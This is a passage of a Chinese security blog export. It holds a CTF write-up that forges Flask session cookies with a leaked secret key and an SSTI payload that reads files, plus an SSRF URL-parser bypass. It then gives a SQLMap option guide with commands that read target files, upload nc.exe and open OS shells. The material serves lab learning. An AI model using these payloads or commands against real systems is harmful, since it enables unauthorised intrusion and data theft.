class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 由于我是在 pycharm 运行，为了方便直接将 session 赋值给 payload</span></span><br><span class="line">    payload = <span class="string">&quot;eyJuMWNvZGUiOm51bGx9.YFVHSw.M_DdKDNd7WMbknyVKSDJ9Y25Z7Q&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(payload.encode()))</span><br><span class="line">    <span class="comment"># print(decryption(sys.argv[1].encode())) </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>{‘n1code’: None}</p>
</blockquote>
</li>
<li><p>flask的 session 伪造需要一个密钥。接下来需要获得<code>SECRET_KEY</code>。在 server.py 源码中有执行 key.py 文件的操作，即<code>execfile(&#39;key.py&#39;)</code>，所以尝试直接访问<code>key.py</code>，成功获得内容：#!/usr/bin/python key = ‘Drmhze6EPcv0fN_81Bj-nA’</p>
</li>
<li><p>接下来是构造 payload。使用知识点中列的博文里的 payload 很多都失败了，我最终成功的形式：<code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code>，使用<code>flask-session-cookie-manager</code>完整的命令形式：<code>python3 flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#39;n1code&#39; : &#39;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code></p>
</li>
</ol>
<ul>
<li>flask-session-cookie-manager：Flask Session Cookie Decoder/Encoder，可以用来对 flask session cookie 编码/解码，实际上第10步也可以用这个来解码</li>
<li><code>Drmhze6EPcv0fN_81Bj-nA</code>，从 key.py 中获得的密钥</li>
<li>整个流程：1. 先对原始 session 解码获得 session 的形式  2. 获取<code>SECRET_KEY</code>  3. 构造 payload  4. 按照解码获得 session 的形式构造 session，再通过<code>flask-session-cookie-manager</code>使用 key 加密编码。</li>
</ul>
<ol start="13">
<li>将<code>flask-session-cookie-manager</code>获得的编码放到请求包的 session 中，再向服务器发送该包，成功获得 flag.py<br><img src="afr_3_flag.png" alt="afr"></li>
</ol>
<h1 id="第二章-Web-进阶"><a href="#第二章-Web-进阶" class="headerlink" title="第二章 Web 进阶"></a>第二章 Web 进阶</h1><h2 id="2-1-SSRF漏洞"><a href="#2-1-SSRF漏洞" class="headerlink" title="2.1 SSRF漏洞"></a>2.1 SSRF漏洞</h2><ol>
<li><p> 进入环境，点击 intersting challenge，代码审计。更详细的代码审计可以看这篇<a href="https://blog.csdn.net/wuyaowangchuan/article/details/110433971">博客</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  <span class="comment"># 高亮显示当前文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="comment">// ^ 匹配行的开始</span></span><br><span class="line">    <span class="comment">// (xyz) 字符组，按照确切的顺序匹配字符 xyz</span></span><br><span class="line">    <span class="comment">// | 分支结构，匹配符号之前的字符或后面的字符</span></span><br><span class="line">    <span class="comment">// ? 	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符</span></span><br><span class="line">    <span class="comment">// \ 转义符，它可以还原元字符原来的含义，允许你匹配保留字符 [ ] ( ) &#123; &#125; . * + ? ^ $ \ |</span></span><br><span class="line">    <span class="comment">// . 匹配除换行符以外的任意字符</span></span><br><span class="line">    <span class="comment">// * 匹配前面的子表达式零次或多次</span></span><br><span class="line">    <span class="comment">// $ 匹配行的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>); </span><br><span class="line">        <span class="comment">// 分解出一个URL的各个部分，返回数组。这是 php 的方法，各种语言对 URL 各部分解析规则会各不一样</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();  <span class="comment"># 初始化</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">#  //抓取URL并把它传递给浏览器，实际上由于解析规则，获得的域名与 php parse_url 方法获得的不一样</span></span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">        var_dump(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    safe_request_url(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>URL 都要经过 check_inner_ip 函数检测，但 php_url_parse 和 curl 对 url 的解析是不同的，强烈看看这篇文章 <a href="https://www.anquanke.com/post/id/86527">【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器</a><br> <img src="ssrf_1_url.png" alt="ssrf"></p>
</li>
<li><p>直接构造<code>?url=http://a@127.0.0.1:80@baidu.com/flag.php</code></p>
</li>
<li><p>后续还有 MySQL、Redies，我是跟着这个博客做的 <a href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></p>
<ol>
<li>查看已经运行的docker镜像 <code>sudo docker ps -a</code></li>
<li>连接到mysql镜像中 <code>sudo docker exec -it 2-web-ssrf_mysql_1 bash</code>,2-web-ssrf_mysql_1 在上一步查看镜像时 NAMES 的内容。<a href="https://www.php.cn/docker/445365.html">怎么访问docker内的MySQL</a></li>
</ol>
<ul>
<li>将 docker 容器中的文件传递到主机:<code>sudo docker cp 2-web-ssrf_mysql_1:/pcap/mysql.pcap /home/chang/</code></li>
</ul>
</li>
</ol>
<h2 id="2-2-命令执行漏洞"><a href="#2-2-命令执行漏洞" class="headerlink" title="2.2 命令执行漏洞"></a>2.2 命令执行漏洞</h2><p>这道题主要是看博文，弄懂 linux文件描述符 和 反弹shell原理再看 writeup 基本上没什么难度了。</p>
<ul>
<li><a href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></li>
<li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1">反弹Shell原理及检测技术研究</a></li>
<li><a href="https://cs-cshi.github.io/2021/03/23/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/">彻底弄懂 Linux 下的文件描述符（fd）</a></li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>《从0到1：CTFer成长之路》</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>超详细SQLMap使用攻略及技巧分享</title>
    <url>/%E8%B6%85%E8%AF%A6%E7%BB%86SQLMap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB/%E8%B6%85%E8%AF%A6%E7%BB%86SQLMap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<span id="more"></span>

<p>sqlmap 相关资源如下：</p>
<p>官方网站：<a href="http://sqlmap.org/%EF%BC%8C">http://sqlmap.org/，</a></p>
<p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a></p>
<p>演示视频：<a href="https://asciinema.org/a/46601">https://asciinema.org/a/46601</a></p>
<p>教程：<a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a></p>
<h2 id="1-1-sqlmap简介"><a href="#1-1-sqlmap简介" class="headerlink" title="1.1 sqlmap简介"></a>1.1 sqlmap简介</h2><p>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>联合查询注入，可以使用union的情况下的注入；</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ul>
<h2 id="1-2-下载及安装"><a href="#1-2-下载及安装" class="headerlink" title="1.2 下载及安装"></a>1.2 下载及安装</h2><p>建议直接看 github：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p>You can download the latest tarball by clicking <a href="https://github.com/sqlmapproject/sqlmap/tarball/master">here</a> or latest zipball by clicking <a href="https://github.com/sqlmapproject/sqlmap/zipball/master">here</a>.</p>
<p>Preferably, you can download sqlmap by cloning the Git repository:</p>
<blockquote>
<p>git clone –depth 1 <a href="https://github.com/sqlmapproject/sqlmap.git">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p>
</blockquote>
<p>sqlmap works out of the box with Python version 2.6, 2.7 and 3.x on any platform.</p>
<h2 id="1-3-SQL使用参数详解"><a href="#1-3-SQL使用参数详解" class="headerlink" title="1.3 SQL使用参数详解"></a>1.3 SQL使用参数详解</h2><p>本文以SQLmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。</p>
<p><code>sqlmap -hh</code> 列出参数说明</p>
<p>用法: sqlmap.py [选项]</p>
<h3 id="1-3-1-选项"><a href="#1-3-1-选项" class="headerlink" title="1.3.1 选项"></a>1.3.1 选项</h3><ul>
<li>-h,–help  显示基本帮助信息并退出</li>
<li>-hh    显示高级帮助信息并退出</li>
<li>–version  显示程序版本信息并退出</li>
<li>-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</li>
</ul>
<h3 id="1-3-2-目标"><a href="#1-3-2-目标" class="headerlink" title="1.3.2 目标"></a>1.3.2 目标</h3><p>在这些选项中必须提供至少有一个确定目标</p>
<ul>
<li> -d DIRECT    直接连接数据库的连接字符串</li>
<li>-u URL, –url=URL   目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1&quot;)%EF%BC%8C%E4%BD%BF%E7%94%A8-u%E6%88%96%E8%80%85--url">http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url</a> </li>
<li>-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标</li>
<li>-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标</li>
<li>-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。</li>
<li>-r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</li>
<li>-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</li>
<li>-c CONFIGFILE       从配置ini文件中加载选项</li>
</ul>
<h3 id="1-3-3-请求"><a href="#1-3-3-请求" class="headerlink" title="1.3.3 请求"></a>1.3.3 请求</h3><p>这些选项可以用来指定如何连接到目标URL</p>
<ul>
<li>–method=METHOD  强制使用给定的HTTP方法（例如put）</li>
<li>–data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。–data=”id=1” -f –banner –dbs –users</li>
<li>–param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</li>
<li>–cookie=COOKIE     HTTP Cookieheader 值</li>
<li>–cookie-del=COO..  用来分隔cookie的字符串值</li>
<li>–load-cookies=L..  Filecontaining cookies in Netscape/wget format</li>
<li>–drop-set-cookie   IgnoreSet-Cookie header from response</li>
<li>–user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org)可以使用--user-agent参数来修改,同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt%E4%B8%AD%E8%8E%B7%E5%8F%96%E3%80%82%E5%BD%93--level%E5%8F%82%E6%95%B0%E8%AE%BE%E5%AE%9A%E4%B8%BA3%E6%88%96%E8%80%853%E4%BB%A5%E4%B8%8A%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E4%BC%9A%E5%B0%9D%E8%AF%95%E5%AF%B9User-Angent%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5">http://sqlmap.org)可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</a></li>
<li>–random-agent     使用random-agent作为HTTP User-Agent头值</li>
<li>–host=HOST         HTTP Hostheader value</li>
<li>–referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</li>
<li>-H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1”)</li>
<li>–headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123”)</li>
<li>–auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</li>
<li>–auth-cred=AUTH..  HTTP 认证凭证(name:password)</li>
<li>–auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</li>
<li>–ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</li>
<li>–ignore-proxy      忽略系统的默认代理设置</li>
<li>–ignore-redirects忽略重定向的尝试</li>
<li>–ignore-timeouts   忽略连接超时</li>
<li>–proxy=PROXY       使用代理服务器连接到目标URL</li>
<li>–proxy-cred=PRO..  代理认证凭证(name:password)</li>
<li>–proxy-file=PRO..  从文件加载代理列表</li>
<li>–tor               使用Tor匿名网络</li>
<li>–tor-port=TORPORT  设置Tor代理端口</li>
<li>–tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</li>
<li>–check-tor       检查Tor的是否正确使用</li>
<li>–delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</li>
<li>–timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</li>
<li>–retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</li>
<li>–randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</li>
<li>–safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下</li>
<li>–safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</li>
<li>–safe-req=SAFER..  从文件中加载安全HTTP请求</li>
<li>–safe-freq=SAFE..  测试一个给定安全网址的两个访问请求</li>
<li>–skip-urlencode    跳过URL的有效载荷数据编码</li>
<li>–csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</li>
<li>–csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌</li>
<li>–force-ssl         强制使用SSL/HTTPS</li>
<li>–hpp               使用HTTP参数污染的方法</li>
<li>–eval=EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)<ul>
<li>sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import</a> hashlib;hash=hashlib.md5(id).hexdigest()”</li>
</ul>
</li>
</ul>
<h3 id="1-3-4-优化"><a href="#1-3-4-优化" class="headerlink" title="1.3.4 优化"></a>1.3.4 优化</h3><p>这些选项可用于优化sqlmap性能</p>
<ul>
<li>-o               打开所有的优化开关</li>
<li>–predict-output    预测普通查询输出</li>
<li>–keep-alive        使用持久HTTP（S）连接</li>
<li>–null-connection   获取页面长度</li>
<li>–threads=THREADS   当前http(s)最大请求数 (默认 1)</li>
</ul>
<h3 id="1-3-5-注入"><a href="#1-3-5-注入" class="headerlink" title="1.3.5 注入"></a>1.3.5 注入</h3><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
<ul>
<li>-p TESTPARAMETER    可测试的参数</li>
<li>–skip=SKIP         跳过对给定参数的测试</li>
<li>–skip-static       跳过测试不显示为动态的参数</li>
<li>–param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）</li>
<li>–dbms=DBMS         强制后端的DBMS为此值</li>
<li>–dbms-cred=DBMS..  DBMS认证凭证(user:password)</li>
<li>–os=OS            强制后端的DBMS操作系统为这个值</li>
<li>–invalid-bignum    使用大数字使值无效</li>
<li>–invalid-logical   使用逻辑操作使值无效</li>
<li>–invalid-string    使用随机字符串使值无效</li>
<li>–no-cast          关闭有效载荷铸造机制</li>
<li>–no-escape         关闭字符串逃逸机制</li>
<li>–prefix=PREFIX     注入payload字符串前缀</li>
<li>–suffix=SUFFIX     注入payload字符串后缀</li>
<li>–tamper=TAMPER   使用给定的脚本篡改注入数据</li>
</ul>
<h3 id="1-3-6-检测"><a href="#1-3-6-检测" class="headerlink" title="1.3.6 检测"></a>1.3.6 检测</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
<ul>
<li>–level=LEVEL     执行测试的等级（1-5，默认为1）</li>
<li>–risk=RISK       执行测试的风险（0-3，默认为1）</li>
<li>–string=STRING    查询时有效时在页面匹配字符串</li>
<li>–not-string=NOT..  当查询求值为无效时匹配的字符串</li>
<li>–regexp=REGEXP     查询时有效时在页面匹配正则表达式</li>
<li>–code=CODE       当查询求值为True时匹配的HTTP代码</li>
<li>–text-only        仅基于在文本内容比较网页</li>
<li>–titles           仅根据他们的标题进行比较</li>
</ul>
<h3 id="1-3-7-技巧"><a href="#1-3-7-技巧" class="headerlink" title="1.3.7 技巧"></a>1.3.7 技巧</h3><p>这些选项可用于调整具体的SQL注入测试</p>
<ul>
<li>–technique=TECH    SQL注入技术测试（默认BEUST）</li>
<li>–time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）</li>
<li>–union-cols=UCOLS  定列范围用于测试UNION查询注入</li>
<li>–union-char=UCHAR  暴力猜测列的字符数</li>
<li>–union-from=UFROM  SQL注入UNION查询使用的格式</li>
<li>–dns-domain=DNS..  DNS泄露攻击使用的域名</li>
<li>–second-order=S..  URL搜索产生的结果页面</li>
</ul>
<h3 id="1-3-8-指纹"><a href="#1-3-8-指纹" class="headerlink" title="1.3.8 指纹"></a>1.3.8 指纹</h3><ul>
<li>-f, –fingerprint   执行广泛的DBMS版本指纹检查</li>
</ul>
<h3 id="1-3-9-枚举"><a href="#1-3-9-枚举" class="headerlink" title="1.3.9 枚举"></a>1.3.9 枚举</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</p>
<ul>
<li>-a, –all           获取所有信息</li>
<li>-b, –banner        获取数据库管理系统的标识</li>
<li>–current-user      获取数据库管理系统当前用户</li>
<li>–current-db        获取数据库管理系统当前数据库</li>
<li>–hostname         获取数据库服务器的主机名称</li>
<li>–is-dba            检测DBMS当前用户是否DBA</li>
<li>–users             枚举数据库管理系统用户</li>
<li>–passwords         枚举数据库管理系统用户密码哈希</li>
<li>–privileges        枚举数据库管理系统用户的权限</li>
<li>–roles            枚举数据库管理系统用户的角色</li>
<li>–dbs             枚举数据库管理系统数据库</li>
<li>–tables            枚举的DBMS数据库中的表</li>
<li>–columns          枚举DBMS数据库表列</li>
<li>–schema            枚举数据库架构</li>
<li>–count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb</li>
<li>–dump            转储数据库表项</li>
<li>–dump-all          转储数据库所有表项</li>
<li>–search           搜索列（S），表（S）和/或数据库名称（S）</li>
<li>–comments          获取DBMS注释</li>
<li>-D DB               要进行枚举的指定数据库名</li>
<li>-T TBL              DBMS数据库表枚举</li>
<li>-C COL             DBMS数据库表列枚举</li>
<li>-X EXCLUDECOL     DBMS数据库表不进行枚举</li>
<li>-U USER           用来进行枚举的数据库用户</li>
<li>–exclude-sysdbs    枚举表时排除系统数据库</li>
<li>–pivot-column=P..  Pivot columnname</li>
<li>–where=DUMPWHERE   Use WHEREcondition while table dumping</li>
<li>–start=LIMITSTART  获取第一个查询输出数据位置</li>
<li>–stop=LIMITSTOP   获取最后查询的输出数据</li>
<li>–first=FIRSTCHAR   第一个查询输出字的字符获取</li>
<li>–last=LASTCHAR    最后查询的输出字字符获取</li>
<li>–sql-query=QUERY   要执行的SQL语句</li>
<li>–sql-shell         提示交互式SQL的shell</li>
<li>–sql-file=SQLFILE  要执行的SQL文件</li>
</ul>
<h3 id="1-3-10-暴力"><a href="#1-3-10-暴力" class="headerlink" title="1.3.10 暴力"></a>1.3.10 暴力</h3><p>这些选项可以被用来运行暴力检查</p>
<ul>
<li>–common-tables     检查存在共同表</li>
<li>–common-columns    检查存在共同列</li>
</ul>
<h3 id="1-3-11-用户自定义函数注入"><a href="#1-3-11-用户自定义函数注入" class="headerlink" title="1.3.11 用户自定义函数注入"></a>1.3.11 用户自定义函数注入</h3><p>这些选项可以用来创建用户自定义函数</p>
<ul>
<li>–udf-inject    注入用户自定义函数</li>
<li>–shared-lib=SHLIB  共享库的本地路径</li>
</ul>
<h3 id="1-3-12-访问文件系统"><a href="#1-3-12-访问文件系统" class="headerlink" title="1.3.12 访问文件系统"></a>1.3.12 访问文件系统</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统</p>
<ul>
<li>–file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe: <code>sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;--file-read &quot;C:/example.exe&quot; -v 1</code></li>
<li>–file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件</li>
<li>–file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径</li>
</ul>
<p>在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：</p>
<blockquote>
<p>python sqlmap.py -u”<a href="http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;">http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;</a> –file-write”/software/nc.exe” –file-dest “C:/WINDOWS/Temp/nc.exe” -v1</p>
</blockquote>
<h3 id="1-3-13-操作系统访问"><a href="#1-3-13-操作系统访问" class="headerlink" title="1.3.13 操作系统访问"></a>1.3.13 操作系统访问</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p>
<ul>
<li>–os-cmd=OSCMD   执行操作系统命令（OSCMD）</li>
<li>–os-shell          交互式的操作系统的shell</li>
<li>–os-pwn          获取一个OOB shell，meterpreter或VNC</li>
<li>–os-smbrelay       一键获取一个OOBshell，meterpreter或VNC</li>
<li>–os-bof           存储过程缓冲区溢出利用</li>
